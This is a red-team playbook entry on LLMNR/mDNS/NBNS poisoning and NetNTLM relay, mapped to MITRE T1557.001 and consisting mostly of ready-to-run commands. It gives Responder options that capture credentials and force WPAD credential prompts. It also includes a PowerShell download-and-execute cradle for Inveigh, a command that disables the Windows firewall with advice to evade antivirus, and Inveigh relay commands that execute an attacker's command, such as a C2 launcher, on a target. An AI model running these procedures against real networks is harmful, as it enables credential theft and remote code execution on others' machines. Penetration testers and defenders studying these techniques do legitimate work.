
# LLMNR/mDNS/NBNS poisonning and SMB relay

## Overview

MITRE ATT&CK mapping: [T1557.001](https://attack.mitre.org/beta/techniques/T1557/001/)

## Procedures

### Classic Responder LLMNR/mDNS/NBNS poisonning

```
# most lightweight version: poisonning + capturing requests only to SMB
Responder.py -I eth0 -f

# as aobove + acting as WPAD web proxy
Responder.py -I eth0 -wrf

# also forces users to provide their creds on WPAD
Responder.py -I eth0 -wfFbv
```

### PowerShell DNS/LLMNR/mDNS/NBNS poisonning

```
# details:
# https://github.com/Kevin-Robertson/Inveigh/
# https://github.com/Kevin-Robertson/Inveigh/wiki/Basics
Invoke-WebRequest -Uri https://github.com/Kevin-Robertson/Inveigh/archive/Inveigh-master.zip -OutFile Inveigh-master.zip

OR (how's this differnet?):

# downloading Inveigh in PowerShell and loading it into memory with:
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1")

# unzip (when .NET Framework 4.5 is available):
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
[System.IO.Compression.ZipFile]::ExtractToDirectory(".\Inveigh-master.zip", ".\Inveigh-master")

# source your PS scripts
cd .\Inveigh-master; cd .\Inveigh-master; . .\Inveigh.ps1

# turn off win firewall (also antivirus should be turned off or evaded):
netsh advfirewall set  allprofiles state off

# run in poisoning mode (Needs PS console with admin privs):
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y

# run in limited poisoning mode (no admin privs):
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -FileOutput Y

# to stop:
Stop-Inveigh
```

### Notes

NetNTLM creds relay (prereq: SMB signing needs to be turned off):

Check: `nmap --script smb-security-mode.nse -p445,139 192.168.12.0/24 --open`

With Inveigh (provides NTLMv1/NTLMv2 HTTP/HTTPS/Proxy to SMB2.1 relay):

```
# we don't launch listener on HTTP as Invoke-InveighRelay will listen on it
Invoke-Inveigh -IP <current-box-ip> -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -HTTP N

# Prepare command to execute (e.g. launcher for C2 Empire):
see below: Empire as C&C

# launch Relay (as cmd provide launcher command form Empire):
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target <ip-to-relay-to> -Command <cmd-to-execute>
```

With Responder:

    https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/

Other tools:

```
https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/
https://github.com/SecureAuthCorp/impacket
```

## OPSEC considerations

## Counter-countermeasures
